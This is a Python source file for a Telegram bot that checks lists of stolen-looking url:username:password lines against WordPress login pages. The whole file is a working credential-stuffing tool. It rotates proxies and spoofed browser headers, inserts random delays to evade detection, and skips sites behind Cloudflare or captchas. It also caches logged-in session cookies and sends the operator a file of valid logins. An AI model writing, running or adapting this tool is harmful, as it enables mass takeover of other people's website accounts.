import os
import sys
import logging
import threading
import aiohttp
import asyncio
import re
import json
import random
import time
from datetime import datetime
from aiohttp_socks import ProxyConnector

try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

from flask import Flask
from pyrogram import Client, filters
from pyrogram.types import Message
from config import API_ID, API_HASH, BOT_TOKEN, ADMINS, PROXIES, MIN_DELAY, MAX_DELAY

# --- Config ---
ALLOWED_USERS = []
if ADMINS:
    ALLOWED_USERS = [int(id.strip()) for id in ADMINS.split(',') if id.strip().isdigit()]

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

def is_admin(user_id):
    return user_id in ALLOWED_USERS if ALLOWED_USERS else False

# --- Flask ---
flask_app = Flask(__name__)

@flask_app.route("/")
def health_check():
    return "Bot running", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port, use_reloader=False, threaded=True)

# ============ ROTATING USER AGENTS & HEADERS ============

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0',
]

ACCEPT_LANGUAGES = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.8,en-US;q=0.7',
    'en-CA,en;q=0.9,fr;q=0.8',
    'en-AU,en;q=0.9',
]

SCREEN_RESOLUTIONS = [
    '1920,1080',
    '1366,768',
    '1440,900',
    '1536,864',
    '1280,720',
]

# Working cookies storage
WORKING_COOKIES = {}

# Failed domains tracking (cooldown)
FAILED_DOMAINS = {}

def get_random_headers():
    """Generate random, realistic browser headers"""
    ua = random.choice(USER_AGENTS)
    lang = random.choice(ACCEPT_LANGUAGES)
    res = random.choice(SCREEN_RESOLUTIONS)
    
    headers = {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': lang,
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'max-age=0',
        'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'Viewport-Width': res.split(',')[0],
        'Width': res.split(',')[0],
    }
    return headers

def get_random_proxy():
    """Get random proxy from list"""
    if not PROXIES or PROXIES == ['']:
        return None
    return random.choice([p for p in PROXIES if p.strip()])

def is_domain_cooled_down(domain):
    """Check if domain is in cooldown due to previous blocks"""
    if domain in FAILED_DOMAINS:
        if time.time() - FAILED_DOMAINS[domain] < 300:  # 5 min cooldown
            return True
    return False

def mark_domain_failed(domain):
    """Mark domain as failed for cooldown"""
    FAILED_DOMAINS[domain] = time.time()

# ============ PARSER ============

def parse_credential_line(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    parts = line.split(':')
    if len(parts) < 3:
        return None
    
    url_part = parts[0]
    remaining = ':'.join(parts[1:])
    
    user_pass = remaining.rsplit(':', 1)
    if len(user_pass) != 2:
        return None
    
    username = user_pass[0]
    password = user_pass[1]
    url = clean_url(url_part)
    
    return (url, username, password)

def clean_url(url):
    url = url.strip().lower()
    url = re.sub(r'^https://https://', 'https://', url)
    url = re.sub(r'^http://http://', 'http://', url)
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    # WordPress specific paths
    if '/wp-login.php' in url:
        url = url.split('?')[0]  # Remove query params
    elif '/password' in url:
        url = url.split('/password')[0] + '/wp-login.php'
    elif '/sign_up' in url:
        url = url.split('/sign_up')[0] + '/wp-login.php'
    elif '/wp-login' not in url:
        url = url.rstrip('/') + '/wp-login.php'
    
    return url

# ============ SMART CHECKER WITH PROXIES ============

async def check_login_smart(login_url, username, password, max_retries=3):
    """
    Smart checker with proxy rotation and anti-detection
    """
    domain = login_url.split('/')[2]
    
    # Check domain cooldown
    if is_domain_cooled_down(domain):
        await asyncio.sleep(60)  # Wait for cooldown
    
    proxy = get_random_proxy()
    
    # Create connector with or without proxy
    if proxy:
        try:
            connector = ProxyConnector.from_url(proxy)
            logger.info(f"Using proxy: {proxy.split('@')[1] if '@' in proxy else proxy}")
        except Exception as e:
            logger.warning(f"Invalid proxy {proxy}: {e}")
            connector = aiohttp.TCPConnector(limit=10, limit_per_host=3, ssl=False)
    else:
        connector = aiohttp.TCPConnector(limit=10, limit_per_host=3, ssl=False)
        logger.info("No proxy available, using direct connection")
    
    timeout = aiohttp.ClientTimeout(total=45, connect=15)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        
        for attempt in range(max_retries):
            try:
                # Random delay before request (CRITICAL)
                delay = random.uniform(MIN_DELAY, MAX_DELAY)
                if attempt > 0:
                    delay += random.uniform(5, 15)  # Extra delay on retry
                logger.info(f"Waiting {delay:.1f}s before request...")
                await asyncio.sleep(delay)
                
                headers = get_random_headers()
                headers['Referer'] = login_url
                headers['Origin'] = f"https://{domain}"
                
                # Step 1: GET login page
                async with session.get(
                    login_url,
                    headers=headers,
                    allow_redirects=True
                ) as get_resp:
                    
                    get_text = await get_resp.text()
                    status = get_resp.status
                    
                    # Handle blocks
                    if status == 403:
                        logger.warning(f"403 Blocked on {domain}")
                        mark_domain_failed(domain)
                        return (None, {'error': '403 Blocked', 'retry_after': 300})
                    
                    if status == 429:
                        retry_after = int(get_resp.headers.get('Retry-After', 120))
                        logger.warning(f"429 Rate limited on {domain}, retry after {retry_after}s")
                        mark_domain_failed(domain)
                        await asyncio.sleep(retry_after)
                        continue  # Retry
                    
                    # Check Cloudflare
                    cf_indicators = [
                        'cf-browser-verification', 'Checking your browser',
                        'Just a moment', 'cf-ray', '__cf_bm',
                        'challenge-platform', 'turnstile'
                    ]
                    if any(x in get_text for x in cf_indicators):
                        logger.warning(f"Cloudflare detected on {domain}")
                        mark_domain_failed(domain)
                        return (None, {'error': 'Cloudflare challenge', 'retry_after': 600})
                    
                    # Extract WordPress nonce and fields
                    payload = {
                        'log': username,
                        'pwd': password,
                        'rememberme': 'forever',
                        'wp-submit': 'Log In',
                        'redirect_to': login_url.replace('wp-login.php', 'wp-admin/'),
                        'testcookie': '1'
                    }
                    
                    # Find all hidden fields
                    hidden_pattern = r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']'
                    for match in re.finditer(hidden_pattern, get_text, re.IGNORECASE):
                        field_name = match.group(1)
                        field_value = match.group(2)
                        if field_name and field_name not in payload:
                            payload[field_name] = field_value
                
                # Human-like typing delay
                await asyncio.sleep(random.uniform(2, 5))
                
                # Step 2: POST login
                post_headers = headers.copy()
                post_headers['Content-Type'] = 'application/x-www-form-urlencoded'
                post_headers['Referer'] = login_url
                
                async with session.post(
                    login_url,
                    data=payload,
                    headers=post_headers,
                    allow_redirects=True
                ) as resp:
                    
                    final_url = str(resp.url)
                    text = await resp.text()
                    status = resp.status
                    
                    # Get cookies
                    cookies_dict = {}
                    for cookie in session.cookie_jar:
                        key = getattr(cookie, 'key', str(cookie))
                        value = getattr(cookie, 'value', '')
                        cookies_dict[key] = value
                    
                    cookie_names = list(cookies_dict.keys())
                    
                    result = {
                        'status': status,
                        'final_url': final_url,
                        'cookies': cookie_names[:10],
                    }
                    
                    # ========== SUCCESS CHECKS ==========
                    
                    # 1. WordPress logged_in cookie (STRONGEST)
                    wp_cookies = [c for c in cookie_names if 'wordpress_logged_in' in c]
                    if wp_cookies:
                        WORKING_COOKIES[domain] = {k: v for k, v in cookies_dict.items() if 'wordpress' in k}
                        return (True, {**result, 'reason': 'WP logged_in cookie found', 'cookie': wp_cookies[0]})
                    
                    # 2. Redirected to wp-admin
                    if '/wp-admin' in final_url and 'wp-login' not in final_url:
                        WORKING_COOKIES[domain] = {k: v for k, v in cookies_dict.items() if 'wordpress' in k}
                        return (True, {**result, 'reason': 'Redirected to wp-admin'})
                    
                    # 3. WordPress auth cookies present
                    auth_cookies = [c for c in cookie_names if any(x in c for x in ['wordpress_', 'wp_'])]
                    if auth_cookies and 'login' not in final_url:
                        return (True, {**result, 'reason': 'WP auth cookies present', 'cookies': auth_cookies})
                    
                    # ========== FAILURE CHECKS ==========
                    
                    text_lower = text.lower()
                    
                    failure_indicators = {
                        'incorrect_password': any(x in text_lower for x in [
                            'incorrect password', 'the password you entered', 
                            'password is incorrect', 'invalid password'
                        ]),
                        'invalid_username': any(x in text_lower for x in [
                            'invalid username', 'unknown username', 
                            'username is incorrect', 'user not found'
                        ]),
                        'login_failed': 'login failed' in text_lower,
                        'authentication_failed': 'authentication failed' in text_lower,
                        'invalid_creds': any(x in text_lower for x in [
                            'invalid credentials', 'wrong credentials'
                        ]),
                    }
                    
                    for reason, detected in failure_indicators.items():
                        if detected:
                            return (False, {**result, 'reason': reason.replace('_', ' ').title()})
                    
                    # Check for 2FA
                    if any(x in text_lower for x in ['two-factor', '2fa', 'authentication code', 'verification code']):
                        return (True, {**result, 'reason': '2FA required - credentials valid', 'needs_2fa': True})
                    
                    # Check for captcha
                    if any(x in text_lower for x in ['captcha', 'recaptcha', 'i\'m not a robot']):
                        return (None, {**result, 'error': 'Captcha required', 'retry_after': 300})
                    
                    # Unknown result
                    return (None, {**result, 'error': 'Unknown response', 'text_sample': text[:500]})
                    
            except asyncio.TimeoutError:
                logger.warning(f"Timeout on attempt {attempt + 1} for {domain}")
                if attempt == max_retries - 1:
                    return (None, {'error': 'Timeout after all retries'})
                await asyncio.sleep(random.uniform(10, 20))
                
            except Exception as e:
                logger.error(f"Error on attempt {attempt + 1} for {domain}: {str(e)}")
                if attempt == max_retries - 1:
                    return (None, {'error': str(e)})
                await asyncio.sleep(random.uniform(5, 10))
        
        return (None, {'error': 'All retries exhausted'})

# ============ BATCH PROCESSING ============

async def process_batch(credentials, progress_callback=None):
    """Process credentials with rate limiting"""
    results = {
        'valid': [],
        'invalid': [],
        'error': [],
        'total': len(credentials)
    }
    
    for i, (url, username, password) in enumerate(credentials):
        try:
            if progress_callback:
                await progress_callback(i + 1, len(credentials), url, username)
            
            is_valid, details = await check_login_smart(url, username, password)
            
            line = f"{url}:{username}:{password}"
            
            if is_valid is True:
                results['valid'].append({
                    'line': line,
                    'details': details
                })
            elif is_valid is False:
                results['invalid'].append({
                    'line': line,
                    'details': details
                })
            else:
                results['error'].append({
                    'line': line,
                    'details': details
                })
                
        except Exception as e:
            logger.error(f"Unexpected error processing {url}: {e}")
            results['error'].append({
                'line': f"{url}:{username}:{password}",
                'details': {'error': str(e)}
            })
    
    return results

# ============ TELEGRAM BOT ============

bot = Client(
    "wp_checker_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

@bot.on_message(filters.command("start"))
async def start_handler(client: Client, message: Message):
    user_id = message.from_user.id
    
    welcome_text = f"""👋 **Welcome to WP Login Checker Bot!**

**Your ID:** `{user_id}`

**Commands:**
• `/check <url> <username> <password>` - Check single login
• `/checkfile` - Upload txt file with credentials
• `/status` - Check bot status

**File Format:** https://site.com/wp-login.php:user@email.com:password123
https://site2.com/wp-login.php:admin:admin123

    
**Note:** Add your ID `{user_id}` to ADMINS env var to use this bot."""
    
    await message.reply_text(welcome_text)

@bot.on_message(filters.command("status"))
async def status_handler(client: Client, message: Message):
    if not is_admin(message.from_user.id):
        await message.reply_text("⛔ You are not authorized!")
        return
    
    proxy_count = len([p for p in PROXIES if p.strip()])
    status_text = f"""📊 **Bot Status**

✅ Bot: Online
🔄 Proxies: {proxy_count} configured
⏱️ Delay: {MIN_DELAY}s - {MAX_DELAY}s
📁 Working cookies cached: {len(WORKING_COOKIES)} domains

**Environment:** Render Free Tier"""
    
    await message.reply_text(status_text)

@bot.on_message(filters.command("check"))
async def check_single_handler(client: Client, message: Message):
    if not is_admin(message.from_user.id):
        await message.reply_text("⛔ You are not authorized!")
        return
    
    args = message.text.split()[1:]
    if len(args) < 3:
        await message.reply_text("❌ Usage: `/check <url> <username> <password>`")
        return
    
    url = args[0]
    username = args[1]
    password = ' '.join(args[2:])  # Password might have spaces
    
    url = clean_url(url)
    
    status_msg = await message.reply_text(f"⏳ Checking `{username}` on {url}...")
    
    try:
        is_valid, details = await check_login_smart(url, username, password)
        
        if is_valid is True:
            result_text = f"""✅ **VALID LOGIN**

🔗 URL: `{url}`
👤 Username: `{username}`
🔑 Password: `{password}`
📋 Reason: {details.get('reason', 'Success')}"""
            
            if details.get('needs_2fa'):
                result_text += "\n⚠️ **2FA Required**"
                
        elif is_valid is False:
            result_text = f"""❌ **INVALID LOGIN**

🔗 URL: `{url}`
👤 Username: `{username}`
🔑 Password: `{password}`
📋 Reason: {details.get('reason', 'Failed')}"""
            
        else:
            result_text = f"""⚠️ **CHECK ERROR**

🔗 URL: `{url}`
👤 Username: `{username}`
❌ Error: {details.get('error', 'Unknown error')}
⏱️ Retry after: {details.get('retry_after', 'N/A')}s"""
        
        await status_msg.edit_text(result_text)
        
    except Exception as e:
        await status_msg.edit_text(f"❌ Error: `{str(e)}`")

@bot.on_message(filters.document & filters.private)
async def file_handler(client: Client, message: Message):
    if not is_admin(message.from_user.id):
        await message.reply_text("⛔ You are not authorized!")
        return
    
    # Check file
    if not message.document.file_name.endswith('.txt'):
        await message.reply_text("❌ Please upload a `.txt` file!")
        return
    
    if message.document.file_size > 5 * 1024 * 1024:  # 5MB limit
        await message.reply_text("❌ File too large! Max 5MB.")
        return
    
    status_msg = await message.reply_text("📥 Downloading file...")
    
    try:
        # Download file
        file_path = await message.download()
        
        await status_msg.edit_text("📖 Reading credentials...")
        
        # Parse credentials
        credentials = []
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line_num, line in enumerate(f, 1):
                parsed = parse_credential_line(line)
                if parsed:
                    credentials.append(parsed)
        
        if not credentials:
            await status_msg.edit_text("❌ No valid credentials found in file!")
            os.remove(file_path)
            return
        
        total = len(credentials)
        await status_msg.edit_text(f"🔍 Found {total} credentials. Starting check...\n⏱️ This may take a while...")
        
        # Progress callback
        async def progress_callback(current, total, url, username):
            if current % 5 == 0 or current == total:  # Update every 5 checks
                try:
                    await status_msg.edit_text(
                        f"🔍 Checking... {current}/{total}\n"
                        f"Current: `{username}` on {url.split('/')[2]}"
                    )
                except:
                    pass
        
        # Process batch
        start_time = time.time()
        results = await process_batch(credentials, progress_callback)
        elapsed = time.time() - start_time
        
        # Create result file
        valid_file = f"valid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(valid_file, 'w') as f:
            for item in results['valid']:
                f.write(item['line'] + '\n')
        
        # Summary
        summary = f"""✅ **Check Complete!**

📊 **Results:**
• Total: {total}
• ✅ Valid: {len(results['valid'])}
• ❌ Invalid: {len(results['invalid'])}
• ⚠️ Errors: {len(results['error'])}
⏱️ Time: {elapsed:.1f}s

📎 Valid credentials file attached below:"""
        
        await status_msg.edit_text(summary)
        
        # Send valid file
        await message.reply_document(
            document=valid_file,
            caption="✅ Valid credentials"
        )
        
        # Cleanup
        os.remove(file_path)
        os.remove(valid_file)
        
    except Exception as e:
        logger.error(f"File processing error: {e}")
        await status_msg.edit_text(f"❌ Error processing file: `{str(e)}`")

# ============ MAIN ============

if __name__ == "__main__":
    # Start Flask in thread
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    logger.info("Flask server started")
    
    # Start bot
    logger.info("Starting Telegram bot...")
    bot.run()
